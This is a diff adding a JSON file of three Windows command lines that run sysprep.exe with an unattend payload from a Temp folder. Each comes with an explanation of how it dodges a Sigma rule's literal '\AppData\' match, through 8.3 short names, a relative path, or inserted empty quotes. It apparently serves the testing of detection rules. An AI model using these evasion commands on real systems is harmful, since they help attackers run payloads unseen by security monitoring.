@@ -1,0 +1,14 @@
+[
+  {
+    "output": "C:\\Windows\\System32\\sysprep\\sysprep.exe /unattend:C:\\Users\\Default\\APPDAT~1\\Local\\Temp\\payload.xml",
+    "explanation": "Bypass using Windows 8.3 short names. The string '\\AppData\\' is replaced with '\\APPDAT~1\\', which evades the literal string match in the Sigma rule while still resolving to the same directory."
+  },
+  {
+    "output": "cmd.exe /c \"cd C:\\Users\\Default\\AppData\\Local\\Temp && C:\\Windows\\System32\\sysprep\\sysprep.exe /unattend:payload.xml\"",
+    "explanation": "Bypass using relative execution. By navigating to the AppData folder first and then invoking sysprep with a relative path to the payload, the command line logged for sysprep.exe will be 'C:\\Windows\\System32\\sysprep\\sysprep.exe /unattend:payload.xml', effectively omitting the '\\AppData\\' string."
+  },
+  {
+    "output": "C:\\Windows\\System32\\sysprep\\sysprep.exe /unattend:C:\\Users\\Default\\App\"\"Data\\Local\\Temp\\payload.xml",
+    "explanation": "Bypass using empty quotes insertion. Command line parsers in Windows often ignore empty double quotes within paths, allowing the execution to succeed while breaking the exact string match for '\\AppData\\' in the SIEM log."
+  }
+]
